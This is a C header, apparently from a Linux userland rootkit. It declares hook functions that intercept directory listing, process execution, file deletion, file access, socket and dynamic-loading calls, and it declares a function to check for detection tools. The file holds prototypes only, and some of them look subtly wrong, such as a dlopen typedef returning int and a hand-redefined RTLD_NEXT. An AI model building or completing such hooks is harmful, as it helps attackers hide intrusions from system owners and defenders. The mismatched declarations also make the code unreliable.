#ifndef HOOKS_H
#define HOOKS_H

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "hide.h"

#define RTLD_NEXT ((void *) -1l)

typedef struct dirent* (*readdir_func_t)(DIR*);
typedef int (*readdir64_func_t)(DIR*, struct dirent64*, struct dirent64**);
typedef int (*execve_func_t)(const char*, char* const[], char* const[]);
typedef int (*unlink_func_t)(const char*);
typedef int (*rmdir_func_t)(const char*);
typedef int (*open_func_t)(const char*, int, ...);
typedef int (*openat_func_t)(int, const char*, int, ...);
typedef int (*stat_func_t)(const char*, struct stat*);
typedef int (*lstat_func_t)(const char*, struct stat*);
typedef int (*access_func_t)(const char*, int);
typedef int (*accept_func_t)(int, struct sockaddr*, socklen_t*);
typedef int (*socket_func_t)(int, int, int);
typedef int (*bind_func_t)(int, const struct sockaddr*, socklen_t);
typedef int (*listen_func_t)(int, int);
typedef int (*connect_func_t)(int, const struct sockaddr*, socklen_t);
typedef int (*dlopen_func_t)(const char*, int);
typedef void* (*dlsym_func_t)(void*, const char*);

struct dirent* hooked_readdir(DIR* dirp);
int hooked_readdir64(DIR* dirp, struct dirent64* entry, struct dirent64** result);
int hooked_execve(const char* pathname, char* const argv[], char* const envp[]);
int hooked_unlink(const char* pathname);
int hooked_rmdir(const char* pathname);
int hooked_open(const char* pathname, int flags, ...);
int hooked_openat(int dirfd, const char* pathname, int flags, ...);
int hooked_stat(const char* pathname, struct stat* statbuf);
int hooked_lstat(const char* pathname, struct stat* statbuf);
int hooked_access(const char* pathname, int mode);
int hooked_accept(int sockfd, struct sockaddr* addr, socklen_t* addrlen);
int hooked_socket(int domain, int type, int protocol);
int hooked_bind(int sockfd, const struct sockaddr* addr, socklen_t addrlen);
int hooked_listen(int sockfd, int backlog);
int hooked_connect(int sockfd, const struct sockaddr* addr, socklen_t addrlen);
void* hooked_dlopen(const char* filename, int flags);
void* hooked_dlsym(void* handle, const char* symbol);

void init_hooks(void);
void check_detection_tools(void);

#endif
